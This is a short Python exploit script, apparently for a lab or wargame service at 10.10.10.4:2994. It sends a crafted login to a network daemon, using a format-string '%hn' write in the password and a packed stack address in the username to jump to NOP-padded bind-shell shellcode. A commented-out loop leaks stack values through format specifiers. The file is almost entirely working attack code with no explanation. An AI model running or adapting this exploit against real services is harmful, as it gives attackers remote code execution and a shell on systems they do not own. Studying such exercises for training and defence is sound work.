#!/usr/bin/env python3
import struct
import sys
import re
from time import sleep
from pwnpy.pwn import *

dest = ('10.10.10.4', 2994)

# Pointers:
# 1: *"Login from ..."
# 2: Source IP:Port
# 3: Username
# 4: Password
# 5: ??? Library
# 6: ??? Stack address
# 7: Login


def login_attempt(username, password):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(dest)
    buf = b''
    # Send username
    buf += b'username '
    buf += username
    buf += b'\n'
    sock.send(buf)

    print(sock.recv(1024))

    # Login
    buf = b'login '
    buf += password
    buf += b'\n'
    sock.send(buf)

    print(sock.recv(1024))
    sock.close()

#init = 1
#for i in range(init, init+60):
#    login_attempt(leak_from(i, amount=1, pointer_type=b'p'), leak_from(i))
#    #login_attempt(b'AAAA', leak_from(i, amount=1))
#    sleep(1)

username = struct.pack('I', 0xbffffa20+(103*4))
reverse_shell = make_bind_tcp()
reverse_shell = reverse_shell.rjust(110, b'\x90')
username += reverse_shell
password = b'%%%dc%%15$hn' % (0xa220 - 34 - 0x78)
login_attempt(username, password)
print(reverse_shell)
